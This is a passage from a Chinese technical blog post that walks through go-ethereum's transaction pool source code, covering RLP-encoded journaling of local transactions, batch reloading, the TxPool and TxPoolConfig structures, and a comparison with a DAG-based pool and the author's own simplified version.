class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/tx_pool.go:757</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *TxPool)</span> <span class="hljs-title">journalTx</span><span class="hljs-params">(from common.Address, tx *types.Transaction)</span></span> &#123;<br>   <span class="hljs-comment">// Only journal if it&#x27;s enabled and the transaction is local</span><br>   <span class="hljs-keyword">if</span> pool.journal == <span class="hljs-literal">nil</span> || !pool.locals.contains(from) &#123;<span class="hljs-comment">//❶</span><br>      <span class="hljs-keyword">return</span><br>   &#125;<br>   <span class="hljs-keyword">if</span> err := pool.journal.insert(tx); err != <span class="hljs-literal">nil</span> &#123; <span class="hljs-comment">//❷</span><br>      log.Warn(<span class="hljs-string">&quot;Failed to journal local transaction&quot;</span>, <span class="hljs-string">&quot;err&quot;</span>, err)<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而 journal.insert 则将交易实时写入文件流中 ❸，相当于实时存储到磁盘。而在写入时，是将交易进行 RLP 编码。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/tx_journal.go:120</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(journal *txJournal)</span> <span class="hljs-title">insert</span><span class="hljs-params">(tx *types.Transaction)</span> <span class="hljs-title">error</span></span> &#123;<br>   <span class="hljs-keyword">if</span> journal.writer == <span class="hljs-literal">nil</span> &#123;<br>      <span class="hljs-keyword">return</span> errNoActiveJournal<br>   &#125;<br>   <span class="hljs-keyword">if</span> err := rlp.Encode(journal.writer, tx); err != <span class="hljs-literal">nil</span> &#123;<span class="hljs-comment">//❸</span><br>      <span class="hljs-keyword">return</span> err<br>   &#125;<br>   <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>插一嘴，为什么要用 RLP 编码？</p></blockquote><h3 id="什么是-RLP"><a href="#什么是-RLP" class="headerlink" title="什么是 RLP"></a>什么是 RLP</h3><p>RLP(Recursive Length Prefix) 递归长度前缀编码是以太坊中最常使用的序列化格式方法。<br>RLP 旨在<strong>成为高度简约的序列化方法</strong>，<strong>唯一目标</strong>就是<strong>存储嵌套的字节数组</strong>。<br>RLP 只是以嵌套数组形式存储结构型数据，由上层协议来确定数组的含义。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1618557745071-1ffc52fc-51a4-40b4-a4a6-9834ee65566b.png#clientId=u272c35f2-3d2a-4&from=paste&height=443&id=u3b9d54f1&originHeight=886&originWidth=1716&originalType=url&status=done&style=none&taskId=u8fd870e4-dcb8-44b2-bd3b-a5ba9cd4ba8&width=858"><br>从图中可以看出，不同类型的数据，将有不同的前缀标识。 前缀也可以理解为报文头，通过报文头可准确获取报文内容。 图中灰色部分则为 RLP 编码输出前缀。</p><h2 id="加载已存储交易"><a href="#加载已存储交易" class="headerlink" title="加载已存储交易"></a>加载已存储交易</h2><p>在交易池首次启动 journal 时，将主动将该文件已存储的交易加载到交易池。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/tx_journal.go:61</span><br><span class="hljs-keyword">if</span> _, err := os.Stat(journal.path); os.IsNotExist(err) &#123; <span class="hljs-comment">//❶</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-comment">// Open the journal for loading any past transactions</span><br>input, err := os.Open(journal.path) <span class="hljs-comment">//❷</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>   <span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">defer</span> input.Close()<br></code></pre></td></tr></table></figure><p>处理时，如果文件不存在则退出 ❶，否则 Open 文件，获得 input 文件流 ❷。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/tx_journal.go:76</span><br>stream := rlp.NewStream(input, <span class="hljs-number">0</span>)<span class="hljs-comment">//❸</span><br>total, dropped := <span class="hljs-number">0</span>, <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>因为存储的内容格式是 rlp 编码内容，因此可以直接初始化 rlp 内容流 ❸，为连续解码做准备。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> (<br>   failure error<br>   batch   types.Transactions<br>)<br><span class="hljs-keyword">for</span> &#123;<br>   tx := <span class="hljs-built_in">new</span>(types.Transaction)<br>   <span class="hljs-keyword">if</span> err = stream.Decode(tx); err != <span class="hljs-literal">nil</span> &#123; <span class="hljs-comment">//❹</span><br>      <span class="hljs-keyword">if</span> err != io.EOF &#123;<br>         failure = err<br>      &#125;<br>      <span class="hljs-keyword">if</span> batch.Len() &gt; <span class="hljs-number">0</span> &#123;<span class="hljs-comment">//❼</span><br>         loadBatch(batch)<br>      &#125;<br>      <span class="hljs-keyword">break</span><br>   &#125;<br>   total++<br><br>   <span class="hljs-keyword">if</span> batch = <span class="hljs-built_in">append</span>(batch, tx); batch.Len() &gt; <span class="hljs-number">1024</span> &#123;<span class="hljs-comment">//❺</span><br>      loadBatch(batch)<span class="hljs-comment">//❻</span><br>      batch = batch[:<span class="hljs-number">0</span>]<br>   &#125;<br>&#125;<br><br>loadBatch := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(txs types.Transactions)</span></span> &#123;<br>   <span class="hljs-keyword">for</span> _, err := <span class="hljs-keyword">range</span> add(txs) &#123;<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>         log.Debug(<span class="hljs-string">&quot;Failed to add journaled transaction&quot;</span>, <span class="hljs-string">&quot;err&quot;</span>, err)<br>         dropped++ <span class="hljs-comment">//❽</span><br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>直接进入 for 循环遍历，不断从 stream 中一笔笔地解码出交易 ❹。<br>但交易并非单笔直接载入交易池，而是采用批量提交模式，每 1024 笔交易提交一次 ❺。<br>批量写入，有利于降低交易池在每次写入交易后的更新。一个批次只需要更新（排序与超限处理等）一次。当然在遍历结束时（err==io.EOF）,也需要将当前批次中的交易载入 ❼。<br>loadBatch 就是将交易一批次加入到交易池，并获得交易池的每笔交易的处理情况。如果交易加入失败，则进行计数 ❽。最终在 load 方法执行完毕时，显示交易载入情况。</p><h1 id="交易添加到交易池"><a href="#交易添加到交易池" class="headerlink" title="交易添加到交易池"></a>交易添加到交易池</h1><p>SendTransaction 最后调用 SubmitTransaction 函数将交易提交到交易池，不过，更底层的调用是 AddLocals 函数。<br>这里需要注意，本地交易时调用 AddLocals，而从对等 p2p 节点发来的交易调用的是另一个函数，AddRemotes 函数。调用这两个函数之前都应该验证交易的有效性。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1618493164007-51ddf037-04a1-45f3-bab1-513adb15efa4.png#clientId=u272c35f2-3d2a-4&from=paste&height=264&id=ue6089192&originHeight=528&originWidth=1174&originalType=binary&size=236384&status=done&style=none&taskId=uf8820385-fb3b-42bb-ab6f-9ae0571e933&width=587"></p><blockquote><p>因为交易时通过节点的 API 接收，因此此交易被视为一笔来自本地(local)（图中用红球表示），在经过一系列校验和处理后。交易成功进入交易池，随后向已连接的邻近节点发送此交易。<br>当邻近节点，如矿工节点从邻近节点接收到此交易时，在进入交易池之前。会将交易标记为来自远方（remote）的交易（图中用绿球表示）。也需要经过校验和处理后，进入矿工节点的交易池，等待矿工打包到区块中。<br>如果邻近节点，不是矿工，也无妨。因为任何节点会默认将接受到得合法交易及时发送给邻近节点。得益于 P2P 网络，一笔交易平均在 6s 内扩散到整个以太坊公链网络的各个节点中。</p></blockquote><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1618538532731-ffb59787-cf5c-4c3d-b310-080abcd97de6.png#clientId=u272c35f2-3d2a-4&from=paste&height=254&id=u528314c1&originHeight=373&originWidth=924&originalType=binary&size=74906&status=done&style=none&taskId=uae16074d-7e82-4415-a530-f8a271e0047&width=629"><br>下面我们来看一下交易池的结构：</p><blockquote><p>这是以太坊的</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// TxPool contains all currently known transactions. Transactions</span><br><span class="hljs-comment">// enter the pool when they are received from the network or submitted</span><br><span class="hljs-comment">// locally. They exit the pool when they are included in the blockchain.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// The pool separates processable transactions (which can be applied to the</span><br><span class="hljs-comment">// current state) and future transactions. Transactions move between those</span><br><span class="hljs-comment">// two states over time as they are received and processed.</span><br><span class="hljs-keyword">type</span> TxPool <span class="hljs-keyword">struct</span> &#123;<br>config      TxPoolConfig<br>chainconfig *params.ChainConfig<br>chain       blockChain<br>gasPrice    *big.Int<br>txFeed      event.Feed<br>scope       event.SubscriptionScope<br>signer      types.Signer<br>mu          sync.RWMutex<br><br>istanbul <span class="hljs-keyword">bool</span> <span class="hljs-comment">// Fork indicator whether we are in the istanbul stage.</span><br><br>currentState  *state.StateDB <span class="hljs-comment">// Current state in the blockchain head</span><br>pendingNonces *txNoncer      <span class="hljs-comment">// Pending state tracking virtual nonces</span><br>currentMaxGas <span class="hljs-keyword">uint64</span>         <span class="hljs-comment">// Current gas limit for transaction caps</span><br><br>locals  *accountSet <span class="hljs-comment">// Set of local transaction to exempt from eviction rules</span><br>journal *txJournal  <span class="hljs-comment">// Journal of local transaction to back up to disk</span><br><br>pending <span class="hljs-keyword">map</span>[common.Address]*txList   <span class="hljs-comment">// All currently processable transactions</span><br>queue   <span class="hljs-keyword">map</span>[common.Address]*txList   <span class="hljs-comment">// Queued but non-processable transactions</span><br>beats   <span class="hljs-keyword">map</span>[common.Address]time.Time <span class="hljs-comment">// Last heartbeat from each known account</span><br>all     *txLookup                    <span class="hljs-comment">// All transactions to allow lookups</span><br>priced  *txPricedList                <span class="hljs-comment">// All transactions sorted by price</span><br><br>chainHeadCh     <span class="hljs-keyword">chan</span> ChainHeadEvent<br>chainHeadSub    event.Subscription<br>reqResetCh      <span class="hljs-keyword">chan</span> *txpoolResetRequest<br>reqPromoteCh    <span class="hljs-keyword">chan</span> *accountSet<br>queueTxEventCh  <span class="hljs-keyword">chan</span> *types.Transaction<br>reorgDoneCh     <span class="hljs-keyword">chan</span> <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;<br>reorgShutdownCh <span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;  <span class="hljs-comment">// requests shutdown of scheduleReorgLoop</span><br>wg              sync.WaitGroup <span class="hljs-comment">// tracks loop, scheduleReorgLoop</span><br>&#125;<br></code></pre></td></tr></table></figure><p>其中最核心的是两个字段，pending 和 queue<br><strong>queued 存放未来的、当前无法执行的交易</strong>。以太坊使用 nonce 值决定某个账户的交易顺序，多条交易值 nonce 值必须连续，如果和过去的交易不连续，则无法执行，我们不妨使用 nonce 值，标记交易的号码，nonce 为 10 的交易，称为第 10 号交易。举个例子，当前账户的 nonce 是 10，txpool 中有该账户的第 100 号交易，但 txpool 中没有第 11<del>99 号交易，这些交易的缺失，造成第 100 号交易无法执行，所以第 100 号交易就是未来的交易、不可执行的交易，存放在 queue 中。<br><strong>pending 存放可执行的交易</strong>。比如我们把上面的 11</del>99 号交易补全了，那么 11~100 号交易都可以进入到 pending，因为这些交易都是连续的，都可以打包进区块。<br>当节点收到交易（本地节点发起的或 peer 广播来的）时，会先存放到 queued，txpool 在某些情况下，把 queued 中可执行的交易，转移到 pending 中。<br>其中 config 的结构体为：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// TxPoolConfig are the configuration parameters of the transaction pool.</span><br><span class="hljs-keyword">type</span> TxPoolConfig <span class="hljs-keyword">struct</span> &#123;<br>Locals    []common.Address <span class="hljs-comment">// Addresses that should be treated by default as local</span><br>NoLocals  <span class="hljs-keyword">bool</span>             <span class="hljs-comment">// Whether local transaction handling should be disabled</span><br>Journal   <span class="hljs-keyword">string</span>           <span class="hljs-comment">// Journal of local transactions to survive node restarts</span><br>Rejournal time.Duration    <span class="hljs-comment">// Time interval to regenerate the local transaction journal</span><br><br>PriceLimit <span class="hljs-keyword">uint64</span> <span class="hljs-comment">// Minimum gas price to enforce for acceptance into the pool</span><br>PriceBump  <span class="hljs-keyword">uint64</span> <span class="hljs-comment">// Minimum price bump percentage to replace an already existing transaction (nonce)</span><br><br>AccountSlots <span class="hljs-keyword">uint64</span> <span class="hljs-comment">// Number of executable transaction slots guaranteed per account</span><br>GlobalSlots  <span class="hljs-keyword">uint64</span> <span class="hljs-comment">// Maximum number of executable transaction slots for all accounts</span><br>AccountQueue <span class="hljs-keyword">uint64</span> <span class="hljs-comment">// Maximum number of non-executable transaction slots permitted per account</span><br>GlobalQueue  <span class="hljs-keyword">uint64</span> <span class="hljs-comment">// Maximum number of non-executable transaction slots for all accounts</span><br><br>Lifetime time.Duration <span class="hljs-comment">// Maximum amount of time non-executable transaction are queued</span><br><br><span class="hljs-comment">// Quorum</span><br>TransactionSizeLimit <span class="hljs-keyword">uint64</span> <span class="hljs-comment">// Maximum size allowed for valid transaction (in KB)</span><br>MaxCodeSize          <span class="hljs-keyword">uint64</span> <span class="hljs-comment">// Maximum size allowed of contract code that can be deployed (in KB)</span><br><br>&#125;<br><br><span class="hljs-keyword">var</span> DefaultTxPoolConfig = TxPoolConfig&#123;<br>Journal:   <span class="hljs-string">&quot;transactions.rlp&quot;</span>,<br>Rejournal: time.Hour,<br><br>PriceLimit: <span class="hljs-number">1</span>,<br>PriceBump:  <span class="hljs-number">10</span>,<br><br>AccountSlots: <span class="hljs-number">16</span>,<br>GlobalSlots:  <span class="hljs-number">4096</span>,<br>AccountQueue: <span class="hljs-number">64</span>,<br>GlobalQueue:  <span class="hljs-number">1024</span>,<br><br>Lifetime: <span class="hljs-number">3</span> * time.Hour,<br><br><span class="hljs-comment">// Quorum</span><br>TransactionSizeLimit: <span class="hljs-number">64</span>,<br>MaxCodeSize:          <span class="hljs-number">24</span>,<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>Locals: 定义了一组视为 local 交易的账户地址。任何来自此清单的交易均被视为 local 交易。</li><li>NoLocals: 是否禁止 local 交易处理。默认为 fasle,允许 local 交易。如果禁止，则来自 local 的交易均视为 remote 交易处理。</li><li>Journal： 存储 local 交易记录的文件名，默认是./transactions.rlp。</li><li>Rejournal：定期将 local 交易存储文件中的时间间隔。默认为每小时一次。</li><li>PriceLimit： remote 交易进入交易池的最低 Price 要求。此设置对 local 交易无效。默认值 1。</li><li>PriceBump：替换交易时所要求的价格上调涨幅比例最低要求。任何低于要求的替换交易均被拒绝。</li><li>AccountSlots： 当交易池中可执行交易（是已在等待矿工打包的交易）量超标时，允许每个账户可以保留在交易池最低交易数。默认值是 16 笔。</li><li>GlobalSlots： 交易池中所允许的可执行交易量上限，高于上限时将释放部分交易。默认是 4096 笔交易。</li><li>AccountQueue：交易池中单个账户非可执行交易上限，默认是 64 笔。</li><li>GlobalQueue： 交易池中所有非可执行交易上限，默认 1024 笔。</li><li>Lifetime： 允许 remote 的非可执行交易可在交易池存活的最长时间。交易池每分钟检查一次，一旦发现有超期的 remote 账户，则移除该账户下的所有非可执行交易。默认为 3 小时。<blockquote><p>参考：<a href="https://learnblockchain.cn/books/geth/part2/txpool/txpool.html">https://learnblockchain.cn/books/geth/part2/txpool/txpool.html</a></p></blockquote></li></ul><p>上面配置中，包含两个重要概念<strong>可执行交易</strong>和<strong>非可执行交易</strong>。可执行交易是指从交易池中择优选出的一部分交易可以被执行，打包到区块中。非可执行交易则相反，任何刚进入交易池的交易均属于非可执行状态，在某一个时刻才会提升为可执行状态。</p><blockquote><p>这是 dag 的</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> TxPool <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">// The following variables must only be used atomically.</span><br>lastUpdated <span class="hljs-keyword">int64</span> <span class="hljs-comment">// last time pool was updated</span><br><br>mtx           sync.RWMutex<br>cfg           Config<br>pool          <span class="hljs-keyword">map</span>[chainhash.Hash]*TxDesc<br>orphans       <span class="hljs-keyword">map</span>[chainhash.Hash]*orphanTx<br>orphansByPrev <span class="hljs-keyword">map</span>[wire.OutPoint]<span class="hljs-keyword">map</span>[chainhash.Hash]*soterutil.Tx<br>outpoints     <span class="hljs-keyword">map</span>[wire.OutPoint]*soterutil.Tx<br>pennyTotal    <span class="hljs-keyword">float64</span> <span class="hljs-comment">// exponentially decaying total for penny spends.</span><br>lastPennyUnix <span class="hljs-keyword">int64</span>   <span class="hljs-comment">// unix time of last ``penny spend&#x27;&#x27;</span><br><br><span class="hljs-comment">// nextExpireScan is the time after which the orphan pool will be</span><br><span class="hljs-comment">// scanned in order to evict orphans.  This is NOT a hard deadline as</span><br><span class="hljs-comment">// the scan will only run when an orphan is added to the pool as opposed</span><br><span class="hljs-comment">// to on an unconditional timer.</span><br>nextExpireScan time.Time<br>&#125;<br></code></pre></td></tr></table></figure><p>交易提交到交易池还需要一个 add 函数，逻辑很简单：</p><ol><li>验证交易的有效性</li><li>如果 nonce 已存在，忽略。</li><li>如果 nonce 不存在，不可以替换 pending 中的任何交易，此时将新的交易插入 queue 的末尾</li></ol><p>注：交易中的 nonce 指的是 from 账户发出交易的次数, 从 0 开始递增，同一账户的交易会被依次确认，所以同一个 nonce 代表是同一个交易，会优先选择 price 更高的交易。</p><blockquote><p>这是我们的</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> TxPool <span class="hljs-keyword">struct</span> &#123;<br>    mtx           sync.RWMutex<br>    config      TxPoolConfig<br>    currentState  *state.StateDB <span class="hljs-comment">// 区块的当前状态</span><br>    locals  *accountSet <span class="hljs-comment">//本地交易</span><br>    journal *txJournal  <span class="hljs-comment">//  用于存储local交易记录的文件</span><br><br>pending <span class="hljs-keyword">map</span>[common.Address]*txList   <span class="hljs-comment">// 存放可执行的交易</span><br>queue   <span class="hljs-keyword">map</span>[common.Address]*txList   <span class="hljs-comment">// queued存放未来的、当前无法执行的交易</span><br><br>    chainHeadSub    event.Subscription<span class="hljs-comment">//用于订阅区块</span><br>    reqPromoteCh    <span class="hljs-keyword">chan</span> *accountSet<span class="hljs-comment">//账户集合</span><br>queueTxEventCh  <span class="hljs-keyword">chan</span> *dag.Tx<span class="hljs-comment">//Tx队列事件</span><br>&#125;<br><br><span class="hljs-keyword">type</span> TxPoolConfig <span class="hljs-keyword">struct</span> &#123;<br>Locals    []common.Address<br>Journal   <span class="hljs-keyword">string</span><br>Rejournal time.Duration<br><br>AccountSlots <span class="hljs-keyword">uint64</span><br>GlobalSlots  <span class="hljs-keyword">uint64</span><br>AccountQueue <span class="hljs-keyword">uint64</span><br>GlobalQueue  <span class="hljs-keyword">uint64</span><br><br>Lifetime time.Duration<br>&#125;<br><br><span class="hljs-keyword">var</span> DefaultTxPoolConfig = TxPoolConfig&#123;<br>Journal:   <span class="hljs-string">&quot;transactions.rlp&quot;</span>,<br>Rejournal: time.Hour,<br><br>AccountSlots: <span class="hljs-number">16</span>,<br>GlobalSlots:  <span class="hljs-number">8192</span>,<br>AccountQueue: <span class="hljs-number">64</span>,<br>GlobalQueue:  <span class="hljs-number">1024</span>,<br><br>Lifetime: <span class="hljs-number">3</span> * time.Hour,<br>&#125;<br></code></pre></td></tr></table></figure><p>当节点收到交易（本地节点发起的或 peer 广播来的）时，会先存放到 queued，txpool 在某些情况下，把 queued 中可执行的交易，转移到 pending 中。</p><ul><li>Locals: 定义了一组视为 local 交易的账户地址。任何来自此清单的交易均被视为 local 交易。</li><li>Journal： 存储 local 交易记录的文件名，默认是./transactions.rlp。</li><li>Rejournal：定期将 local 交易存储文件中的时间间隔。默认为每小时一次。</li><li>AccountSlots： 当交易池中可执行交易（是已在等待矿工打包的交易）量超标时，允许每个账户可以保留在交易池最低交易数。默认值是 16 笔。</li><li>GlobalSlots： 交易池中所允许的可执行交易量上限，高于上限时将释放部分交易。默认是 8192 笔交易。</li><li>AccountQueue：交易池中单个账户非可执行交易上限，默认是 64 笔。</li><li>GlobalQueue： 交易池中所有非可执行交易上限，默认 1024 笔。</li><li>Lifetime： 允许 remote 的非可执行交易可在交易池存活的最长时间。交易池每分钟检查一次，一旦发现有超期的 remote 账户，则移除该账户下的所有非可执行交易。默认为 3 小时。</li></ul><h2 id="链状态"><a href="#链状态" class="headerlink" title="链状态"></a>链状态</h2><p>在交易池启动后，将订阅链的区块头事件：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/tx_pool.go:274</span><br>pool.chainHeadSub = pool.chain.SubscribeChainHeadEvent(pool.chainHeadCh)<br></code></pre></td></tr></table></figure><p>并开始监听新事件：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/tx_pool.go:305</span><br><span class="hljs-keyword">for</span> &#123;<br>   <span class="hljs-keyword">select</span> &#123;<br>   <span class="hljs-comment">// Handle ChainHeadEvent</span><br>   <span class="hljs-keyword">case</span> ev := &lt;-pool.chainHeadCh:<br>      <span class="hljs-keyword">if</span> ev.Block != <span class="hljs-literal">nil</span> &#123;<br>         pool.mu.Lock()<br>         <span class="hljs-keyword">if</span> pool.chainconfig.IsHomestead(ev.Block.Number()) &#123;<br>            pool.homestead = <span class="hljs-literal">true</span><br>         &#125;<br>         pool.reset(head.Header(), ev.Block.Header())<br>         head = ev.Block<br><br>         pool.mu.Unlock()<br>      &#125;<br>  <span class="hljs-comment">//...</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>接收到事件后，将执行 func (pool *TxPool) reset(oldHead, newHead *types.Header)方法更新 state 和处理交易。核心是将交易池中已经不符合要求的交易删除并更新整理交易</p><h2 id="本地交易"><a href="#本地交易" class="headerlink" title="本地交易"></a>本地交易</h2><p>在交易池中将交易标记为 local 的有多种用途：</p><ol><li>在本地磁盘存储已发送的交易。这样，本地交易不会丢失，重启节点时可以重新加载到交易池，实时广播出去。</li><li>可以作为外部程序和以太坊沟通的一个渠道。外部程序只需要监听文件内容变化，则可以获得交易清单。</li><li>local 交易可优先于 remote 交易。对交易量的限制等操作，不影响 local 下的账户和交易。</li></ol><p>对应本地交易存储，在启动交易池时根据配置开启本地交易存储能力：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//core/tx_pool.go:264</span><br><span class="hljs-keyword">if</span> !config.NoLocals &amp;&amp; config.Journal != <span class="hljs-string">&quot;&quot;</span> &#123;<br>pool.journal = newTxJournal(config.Journal)<br><span class="hljs-keyword">if</span> err := pool.journal.load(pool.AddLocals); err != <span class="hljs-literal">nil</span> &#123;<br>log.Warn(<span class="hljs-string">&quot;Failed to load transaction journal&quot;</span>, <span class="hljs-string">&quot;err&quot;</span>, err)<br>&#125;<br>    <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>并从磁盘中加载已有交易到交易池。在新的 local 交易进入交易池时，将被实时写入 journal 文件。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// core/tx_pool.go:757</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *TxPool)</span> <span class="hljs-title">journalTx</span><span class="hljs-params">(from common.Address, tx *types.Transaction)</span></span> &#123;<br>   <span class="hljs-keyword">if</span> pool.journal == <span class="hljs-literal">nil</span> || !pool.locals.contains(from) &#123;<br>      <span class="hljs-keyword">return</span><br>   &#125;<br>   <span class="hljs-keyword">if</span> err := pool.journal.insert(tx); err != <span class="hljs-literal">nil</span> &#123;<br>      log.Warn(<span class="hljs-string">&quot;Failed to journal local transaction&quot;</span>, <span class="hljs-string">&quot;err&quot;</span>, err)<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>从上可看到，<strong>只有属于 local 账户的交易才会被记录</strong>。你又没有注意到，如果仅仅是这样的话，journal 